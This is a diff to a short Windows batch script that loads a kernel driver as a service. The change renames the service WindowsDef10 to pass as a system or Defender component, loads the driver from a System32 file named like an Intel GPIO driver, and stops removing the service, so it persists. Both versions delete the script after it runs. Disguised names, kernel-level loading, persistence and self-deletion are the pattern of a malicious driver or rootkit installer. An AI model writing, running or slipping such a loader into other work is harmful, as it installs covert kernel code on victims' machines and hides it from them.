@@ -1,6 +1,5 @@
 @echo off
 cd %~dp0
-sc create WindowsGdi binpath=C:\Windows\servicing\CbsApe.sys type=kernel
-sc start WindowsGdi
-sc delete WindowsGdi
+sc create WindowsDef10 binpath=C:\Windows\System32\iaLPSS9i_GPIO_CNL.sys type=kernel
+sc start WindowsDef10
 del "%~f0"
